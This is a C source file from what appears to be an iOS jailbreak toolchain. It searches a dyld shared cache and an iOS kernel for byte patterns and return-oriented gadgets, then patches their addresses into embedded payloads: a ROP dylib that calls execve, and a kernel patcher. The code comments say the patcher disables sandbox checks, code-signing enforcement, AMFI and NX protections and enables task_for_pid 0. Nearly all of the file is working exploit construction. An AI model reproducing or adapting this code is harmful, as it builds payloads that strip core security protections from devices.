#include "common.h"
#include "find.h"
#include "binary.h"
extern unsigned char pf2_bin[], one_bin[];
extern unsigned int pf2_bin_len, one_bin_len;

static bool is_armv7;

// case-specific stuff

// count the number of set bits
static int count_ones(uint32_t number) {
    int result = 0;
    for(; number; number >>= 1) {
        result += (number & 1);
    }
    return result;
}

// ldmib<cond> r11/r11!, {.., .., .., sp, pc}
addr_t find_kinit(struct binary *binary, uint32_t cond) {
    range_t range;
    for(int i = 0; (range = b_dyldcache_nth_segment(binary, i)).start; i++) {
        uint32_t *p = rangeconv(range).start;
        for(addr_t addr = range.start; addr + 4 <= (range.start + range.size); addr += 4) {
            // <3 http://a.qoid.us/01x.py
            uint32_t val = *p++;
            if((val & 0xfdfe000) != 0x99ba000) continue;
            uint32_t actual_cond = ((val & 0xf0000000) >> 28);
            if(actual_cond != cond) continue;
            uint32_t reglist = val & 0x1fff;
            // The famous interview question: calculate the number of 1 bits
            if(count_ones(reglist) != 3) continue;
            return addr; 
        }
    }
    die("didn't find kinit /anywhere/"); 
}

uint32_t find_dvp_struct_offset(struct binary *binary) {
    range_t range = b_macho_segrange(binary, "__PRELINK_TEXT");
    addr_t derive_vnode_path = find_bof(range, find_int32(range, find_string(range, "path", 0, true), true), is_armv7);
    uint8_t byte = read8(binary, find_data((range_t){binary, derive_vnode_path, 1024}, !is_armv7 ? "00 00 50 e3 02 30 a0 11 - .. 00 94 e5" : "- .. 69 6a 46", 0, true));
    if(is_armv7) {
        return (4 | (byte >> 6)) << 2;
    } else {
        return byte;
    }
}

void test_armv7(struct binary *binary) {
    switch(binary->actual_cpusubtype) {
    case 6:
        is_armv7 = false;
        break;
    case 9:
        is_armv7 = true;
        break;
    default:
        die("unknown cpusubtype %d", binary->actual_cpusubtype);
    }
}

prange_t bar(struct binary *binary) {
    test_armv7(binary);
    prange_t the_dylib = pdup((prange_t) {one_bin, one_bin_len});    
    // hexydec
    int align = is_armv7 ? 2 : 4;
    preplace32(the_dylib, 0xfeed0004, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ 00 68 b0 bd" : "- 00 00 90 e5 b0 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0005, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ 20 60 90 bd" : "- 00 00 84 e5 90 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0006, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ 20 44 90 bd" : "- 00 00 84 e0 90 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0007, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ 0f bd" : "- 0f 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0009, b_dyldcache_find_anywhere(binary, "+ 0e bd", 2));
    preplace32(the_dylib, 0xfeed0010, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ a7 f1 00 0d 80 bd" : "- 00 d0 47 e2 80 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0011, b_dyldcache_find_anywhere(binary, "+ f0 bd", 2));
    preplace32(the_dylib, 0xfeed0012, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ a0 47 b0 bd" : "- 34 ff 2f e1 b0 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0014, b_dyldcache_find_anywhere(binary, "+ 20 58 90 bd", 2));
    preplace32(the_dylib, 0xfeed0015, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ 40 f8 04 4b 90 bd" : "- 00 40 80 e5 90 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0016, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ 20 68 90 bd" : "- 00 00 94 e5 90 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0017, b_dyldcache_find_anywhere(binary, is_armv7 ? "+ 25 60 b0 bd" : "- 00 50 84 e5 b0 80 bd e8", align));
    preplace32(the_dylib, 0xfeed0018, b_dyldcache_find_anywhere(binary, "+ 10 bd", 2));
    preplace32(the_dylib, 0xfeed0019, b_dyldcache_find_anywhere(binary, "+ 80 bd", 2));
    preplace32(the_dylib, 0xdeadfeed, find_kinit(binary, is_armv7 ? 4 /* MI */ : 5 /* PL */));
    b_dyldcache_load_macho(binary, "/usr/lib/libSystem.B.dylib");
    preplace32(the_dylib, 0xfeed1001, b_sym(binary, "_sysctlbyname", true));
    preplace32(the_dylib, 0xfeed1002, b_sym(binary, "_execve", true));
    return the_dylib;
}

prange_t foo(struct binary *binary) {
    test_armv7(binary);

    prange_t pf2 = pdup((prange_t) {pf2_bin, pf2_bin_len});

    preplace32(pf2, 0xfeee0000, (uint32_t) is_armv7);

    // sandbox
    range_t range = b_macho_segrange(binary, "__PRELINK_TEXT");
    addr_t sb_evaluate = find_bof(range, find_int32(range, find_string(range, "bad opcode", false, true), true), is_armv7);
    preplace32(pf2, 0xfeed0001, read32(binary, sb_evaluate));
    preplace32(pf2, 0xfeed0002, read32(binary, sb_evaluate + 4));
    preplace32(pf2, 0xfeed0003, sb_evaluate + (is_armv7 ? 9 : 8));
    preplace32(pf2, 0xfeed0004, b_sym(binary, "_memcmp", true));
    preplace32(pf2, 0xfeed0005, b_sym(binary, "_vn_getpath", true));
    preplace32(pf2, 0xfeed0006, find_dvp_struct_offset(binary));
    
    // kernel_pmap->nx_enabled
    preplace32(pf2, 0xfedd0002, read32(binary, b_sym(binary, "_kernel_pmap", false)) + 0x420);
    addr_t sysent = find_data(b_macho_segrange(binary, "__DATA"), "21 00 00 00 00 10 86 00 -", 0, true);
    preplace32(pf2, 0xfedd0004, sysent + 4);
    addr_t sysent_patch_orig = read32(binary, sysent + 4);
    preplace32(pf2, 0xfedd0005, sysent_patch_orig);
    // target_addr
    printf("sysent_patch_orig = %x %x\n", sysent, sysent_patch_orig);
    preplace32(pf2, 0xfedd0006, (sysent_patch_orig & 0x00ffffff) | 0x2f000000);

    // vm_map_enter (patch1) - allow RWX pages
    preplace32(pf2, 0xfedd0007, find_data(b_macho_segrange(binary, "__TEXT"), is_armv7 ? "- 02 0f .. .. 63 08 03 f0 01 05 e3 0a 13 f0 01 03" : "- .. .. .. .. 6b 08 1e 1c eb 0a 01 22 1c 1c 16 40 14 40", 0, true));
    preplace32(pf2, 0xfedd0016, is_armv7 ? 0x46c00f02 : 0x46c046c0);

    // AMFI (patch3) - disable the predefined list of executable stuff
    preplace32(pf2, 0xfedd0008, find_data(b_macho_segrange(binary, "__PRELINK_TEXT"), is_armv7 ? "23 78 9c 45 05 d1 .. .. .. .. .. .. .. 4b 98 47 00 .. -" : "13 20 a0 e3 .. .. .. .. 33 ff 2f e1 00 00 50 e3 00 00 00 0a .. 40 a0 e3 - 04 00 a0 e1 90 80 bd e8", 0, true));
    preplace32(pf2, 0xfedd0017, is_armv7 ? 0x1c201c20 : 0xe3a00001);
    // PE_i_can_has_debugger (patch4) - so AMFI allows non-ldid'd binaries (and some other stuff is allowed)
    preplace32(pf2, 0xfedd0018, b_sym(binary, "_PE_i_can_has_debugger", false));

    // task_for_pid 0
    preplace32(pf2, 0xfedd0009, find_data(b_macho_segrange(binary, "__TEXT"), is_armv7 ? "85 68 00 23 .. 93 .. 93 - .. .. .. .. 29 46 04 22" : "85 68 .. 93 .. 93 - 00 2c 0b d1", 0, true));
        
    // cs_enforcement_disable
    preplace32(pf2, 0xfedd0001, resolve_ldr(binary, find_data(b_macho_segrange(binary, "__TEXT"), is_armv7 ? "1d ee 90 3f d3 f8 4c 33 d3 f8 9c 20 + .. .. .. .. 19 68 00 29" : "9c 22 03 59 99 58 + .. .. 1a 68 00 2a", 0, true)));

    preplace32(pf2, 0xfedd0010, b_sym(binary, "_flush_dcache", true));
    preplace32(pf2, 0xfedd0011, b_sym(binary, "_invalidate_icache", true));
    preplace32(pf2, 0xfedd0012, b_sym(binary, "_copyin", true));
    preplace32(pf2, 0xfedd0013, b_sym(binary, "_IOLog", true));
    preplace32(pf2, 0xfedd0014, b_sym(binary, "_kalloc", true));
    preplace32(pf2, 0xfedd0015, sb_evaluate);
    return pf2;
}

int main(int argc, char **argv) {
    if(argc <= 1 || argv[1][0] != '-') goto usage;
    struct binary binary;
    b_init(&binary);
    switch(argv[1][1]) {
    case 'C':
        b_load_dyldcache(&binary, argv[2], true);
        write_range(bar(&binary), "libgmalloc.dylib", 0644);
        return 0;
    case 'c':
        b_load_dyldcache(&binary, argv[2], false);
        write_range(bar(&binary), "libgmalloc.dylib", 0644);
        return 0;
    case 'k':
        b_load_macho(&binary, argv[2]);
        write_range(foo(&binary), "pf2", 0755);
        return 0;
    case 'K':
        b_running_kernel_load_macho(&binary);  
        write_range(foo(&binary), "pf2", 0755);
        return 0;
    }
    usage:
    fprintf(stderr, "Usage: data -c cache | -k kernel | -C cache | -K\n");
    return 1;
}
